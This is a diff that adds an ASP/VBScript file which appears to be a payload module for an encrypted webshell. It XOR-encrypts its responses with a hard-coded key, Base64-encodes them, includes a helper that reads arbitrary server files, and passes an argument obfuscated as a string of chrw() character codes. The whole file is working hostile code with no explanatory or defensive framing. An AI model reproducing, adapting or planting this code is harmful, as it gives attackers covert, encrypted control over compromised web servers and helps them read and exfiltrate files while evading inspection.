@@ -1,0 +1,101 @@
+Dim status,message
+status="success"
+
+Function Encrypt(data)
+k="e45e329feb5d925b"
+size=len(data)
+Dim result
+For i=1 To size
+result=result&Chrb(asc(mid(data,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
+Next
+Encrypt=result
+End Function 
+
+Function Base64Encode(sText)
+    Dim oXML, oNode
+
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue =Stream_StringToBinary(sText)
+    If Mid(oNode.text,1,4)="77u/" Then
+    oNode.text=Mid(oNode.text,5)
+    End If
+    Base64Encode = Replace(oNode.text, vbLf, "")
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function Stream_StringToBinary(Text)
+  Const adTypeText = 2
+  Const adTypeBinary = 1
+  Dim BinaryStream 'As New Stream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  BinaryStream.Type = adTypeText
+  BinaryStream.CharSet = "utf-8"
+  BinaryStream.Open
+  BinaryStream.WriteText Text
+  BinaryStream.Position = 0
+  BinaryStream.Type = adTypeBinary
+  BinaryStream.Position = 0
+  Stream_StringToBinary = BinaryStream.Read
+  Set BinaryStream = Nothing
+End Function
+
+
+Function GetErr(Err)
+	If Err Then
+		GetErr= "<font size=2><li>Error:"&Err.Description&"</li><li>ErrorSource:"&Err.Source&"</li><br>"
+	End If
+End Function
+Function GetStream()
+	Set GetStream=CreateObject("Adodb.Stream")
+End Function
+Function GetFso()
+	Dim Fso,Key
+	Key="Scripting.FileSystemObject"
+	Set Fso=server.CreateObject(Key)
+	Set GetFso=Fso
+End Function
+Function FileRead(FilePath,A)
+	on error resume next
+	If FilePath<>"" then
+		Dim Stream,filecontent,Fso
+		If A="Stream" then
+			Set Stream=GetStream()
+			with Stream
+				.type=2
+				.mode=3
+				.open
+				.charset="gbk"
+				.LoadFromFile FilePath
+				filecontent=.ReadText()
+				.close
+			End With
+			
+			Set Stream=Nothing
+		Else
+			Set Fso=GetFso()
+			filecontent=Fso.OpenTextFile(FilePath).ReadAll
+			If Err Then 
+				status="fail"
+				message=GetErr(err)
+			End If 
+			Set Fso=Nothing
+		End If
+	FileRead=filecontent
+	End If
+End Function
+
+Sub echo(content)
+on error resume Next
+finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(content)&"""}"
+Response.binarywrite(Encrypt(finalResult))
+End Sub
+
+Sub main(arrArgs)
+content=arrArgs(0)
+echo(content)
+End Sub
+
+main Array(chrw(86)&chrw(113)&chrw(112)&chrw(71)&chrw(57)&chrw(65)&chrw(54)&chrw(67)&chrw(84)&chrw(113)&chrw(57)&chrw(50)&chrw(98)&chrw(48)&chrw(110)&chrw(51)&chrw(111)&chrw(74)&chrw(55)&chrw(74)&chrw(48)&chrw(65)&chrw(81)&chrw(112)&chrw(90)&chrw(81)&chrw(107)&chrw(75)&chrw(117)&chrw(49)&chrw(105)&chrw(97)&chrw(71)&chrw(81)&chrw(55)&chrw(49)&chrw(49)&chrw(69)&chrw(103)&chrw(107)&chrw(107)&chrw(83)&chrw(100)&chrw(98)&chrw(103)&chrw(69)&chrw(116)&chrw(98)&chrw(108)&chrw(71)&chrw(68)&chrw(71)&chrw(105)&chrw(107)&chrw(114)&chrw(70)&chrw(100)&chrw(87)&chrw(101)&chrw(70)&chrw(51)&chrw(77)&chrw(102)&chrw(88)&chrw(51)&chrw(89)&chrw(55)&chrw(105)&chrw(77)&chrw(50)&chrw(75)&chrw(101)&chrw(113)&chrw(77)&chrw(114)&chrw(88)&chrw(57)&chrw(116)&chrw(73)&chrw(87)&chrw(81)&chrw(101)&chrw(106)&chrw(83)&chrw(101)&chrw(118))
